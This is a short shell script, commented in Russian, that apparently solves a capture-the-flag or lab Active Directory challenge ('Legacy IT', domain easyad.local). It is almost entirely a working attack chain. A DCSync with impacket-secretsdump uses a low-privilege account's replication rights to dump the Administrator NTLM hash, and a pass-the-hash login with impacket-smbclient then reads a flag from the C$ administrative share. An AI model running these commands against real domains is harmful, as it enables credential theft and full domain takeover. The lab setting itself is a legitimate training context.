#!/bin/sh
# Legacy IT: путь от учётки trainee до флага на DC.
# Значения инстанса заменены заглушками.

DC=10.0.0.0        # контроллер домена easyad.local
USER=trainee
PASS='<password>'

# 1. DCSync: учётка trainee имеет права на репликацию,
#    поэтому secretsdump забирает хэш Administrator напрямую.
impacket-secretsdump -just-dc-user Administrator \
  "$USER:$PASS@$DC" -dc-ip "$DC"
# -> Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ntlm>:::

# 2. Вход по NT-хэшу и чтение флага с административной шары.
impacket-smbclient -hashes :<ntlm> 'easyad.local/Administrator@$DC'
#   use C$
#   cd Users\Administrator\Desktop
#   cat flag.txt
